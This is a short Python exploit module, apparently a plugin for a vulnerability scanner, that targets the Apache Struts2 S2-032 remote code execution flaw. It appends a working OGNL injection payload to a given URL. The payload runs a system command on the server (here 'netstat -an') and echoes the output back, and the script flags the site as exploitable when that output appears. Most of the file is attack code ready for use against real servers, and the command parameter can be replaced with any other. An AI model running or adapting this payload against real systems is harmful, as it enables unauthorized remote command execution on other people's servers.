#! /usr/bin/env python
#coding:utf-8
import requests

author = ""
scope = ""
description = "Struts2 远程代码执行漏洞"
reference = ""
options = [
    {
        "Name": "URL",
        "Current Setting": "",
        "Required": True,
        "Description": "网站地址"
    }
]

def struts2_032(url):
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    exp = '''?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=netstat%20-an&pp=\\A&ppp=%20&encoding=UTF-8'''
    url += exp

    try:
        resp = requests.get(url, headers=headers, timeout=10)
        if "0.0.0.0" in resp.content:
            return "s2-032 存在利用"
    except:
        return None
    return None